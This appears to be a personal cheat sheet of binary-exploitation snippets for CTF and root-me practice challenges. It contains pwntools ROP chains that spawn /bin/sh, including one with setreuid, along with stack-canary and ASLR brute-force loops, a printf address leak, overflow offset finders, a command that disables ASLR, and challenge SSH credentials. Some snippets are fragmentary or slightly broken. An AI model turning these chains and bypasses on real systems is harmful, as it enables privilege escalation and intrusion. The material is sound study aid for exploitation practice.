
Keep stdin open
```bash
(cat explt.txt; cat) | ./a.out
```

Disable ASLR
```bash
echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
```

Template
```bash
pwn template > explt.py
```

Patchelf
```bash
patchelf --replace-needed liboriginal.so.1 $PWD/libreplacement.so.1 my-program
-
```

One_gadget
```fish
one_gadget (ldd bin | grep libc.so | cut -d' ' -f3)
```

Pwntools remote
```python
elif args.SSH:
	return ssh(user='app-systeme-ch77', host='challenge03.root-me.org', port=2223, password='app-systeme-ch77').process("./ch77")
elif args.REM:
	return remote(host='challenge03.root-me.org', port=56577)
```

Docker
``` bash
sudo docker run --rm -it --cap-add=SYS_PTRACE --security-opt seccomp=unconfined (sudo docker build -q .)
```

32bits ROP chain
```python
system = lib.sym["system"]
binsh = next(lib.search(b'/bin/sh'))

rop = ROP(context.binary)

rop.raw(base+system)
rop.raw(0xdeadbeef)
rop.raw(base+binsh)

raw_rop = rop.chain()
```

32 bits typical ROP chain
```python
base_libc = 0xf7d79000
system = lib.sym["system"]
	setreuid = lib.sym["setreuid"]
binsh = next(elf.search(b'/bin/sh'))
two_pops = 0x080485b2

rop = ROP(context.binary)

rop.raw(base_libc+setreuid)
rop.raw(two_pops)
rop.raw(1224)
rop.raw(1224)
rop.raw(base_libc+system)
rop.raw(0xdeadbeef)
rop.raw(base_libc+binsh)

raw_rop = rop.chain()
```

64 bits typical ROP chain
```python
system = libc.sym["system"]
binsh = next(libc.search(b'/bin/sh'))

libc.address = base
rop_libc = ROP(libc)

pop_rdi = rop_libc.find_gadget(['pop rdi', 'ret'])[0]
ret = rop_libc.find_gadget(['ret'])[0]

rop = ROP(exe)

rop.raw(pop_rdi)
rop.raw(binsh)
rop.raw(ret)
rop.raw(system)
rop.raw(0xdeadbeef)

print(rop.dump())
raw_rop = rop.chain()
```

32 bits ASLR brutforce, no PIE
```bash
while true; do echo -ne "."; (cat /tmp/q/explt.txt; cat) | ./ch25; done
```

ASLR leak 32bits printf
```python
fmt_s = 0x0804942C
rop = ROP(exe)

rop.raw(exe.plt['printf'])
rop.raw(p32(0xdeadbeef))
rop.raw(p32(fmt_s))
rop.raw(exe.got['printf'])
```

32 bits canary brutforce example
```python
def bf_canary(serv, client):
    canary_offset = 0x81
    cpy_size = canary_offset
    canary = 0x00000000
    i = 0
    test_byte = 0x00
    while i < 4:
        if (test_byte > 0xff):
            print('all cases tested, rip')
            exit(0)

        payload = p32(cpy_size  & 0xff) #size ==> 0x80: canary start
        payload += cyclic(canary_offset - 4) # padding
        payload += p32(canary | (test_byte << i*8))

        io = client.process(["nc", "localhost", port])
        io.send(payload)
        io.close()
        print(test_byte)

        print(serv.recvline())  
        print(serv.recvline())
        print(serv.recvline())

        line = b''
        if serv.can_recv(1):
            line = serv.recvline()

        print(b"-------------" + line)
        if b'*** stack smashing detected ***' in line:
            test_byte += 1
        else:
            canary |= (test_byte << i*8)
            test_byte = 0x00
            cpy_size += 1
            i += 1

    print(f'canary = {hex(canary)}')
    return canary
```


Automatic BoF offset finder
```python
#!/usr/bin/env python3

# enable core dumps in current folder: echo "%e.%p" > /proc/sys/kernel/core_pattern

from pwn import *

exe = ELF('./ch37')

payload = cyclic(0x100)

def start():
if args.ARGS:
	return process([exe.path, payload])
else:
	return process([exe.path])

io = start()
io.wait()

pid = io.__getattr__('pid')
corefile = f'{exe.path}.{pid}'
core = Coredump(corefile)
os.remove(corefile)

offset = cyclic_find(core.fault_addr) #cyclic_find(core.rip/eip)

io.sendline(cyclic(offset) + p64(0xdeadbeef))

io.interractive()
```

```python
# Automatic BoF offset finder function
def find_offset(io):
	io.sendline(cyclic(0x100))
	io.wait()
	
	pid = io.__getattr__('pid')
	corefile = f'{exe.path}.{pid}'
	core = Coredump(corefile)
	os.remove(corefile)
	
	io.close()
	return cyclic_find(core.fault_addr) #cyclic_find(core.rip/eip)
```